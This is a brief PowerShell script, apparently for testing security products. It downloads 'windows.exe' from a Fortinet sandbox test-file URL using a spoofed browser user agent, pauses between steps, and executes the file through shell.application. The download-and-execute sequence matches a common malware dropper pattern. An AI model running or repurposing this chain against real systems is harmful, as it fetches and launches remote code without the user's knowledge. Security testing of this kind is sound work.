Invoke-WebRequest https://filegen.fortinet.com/v1/sandbox-file?file_name=windows.exe -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36'
Start-Sleep -Seconds 1
$down = New-Object System.Net.WebClient
Start-Sleep -Seconds 1
$url = 'https://filegen.fortinet.com/v1/sandbox-file?file_name=windows.exe';
Start-Sleep -Seconds 1
$file = 'windows.exe';
Start-Sleep -Seconds 1
$down.DownloadFile($url,$file);
Start-Sleep -Seconds 1
$exec = New-Object -com shell.application
Start-Sleep -Seconds 1
$exec.shellexecute($file);
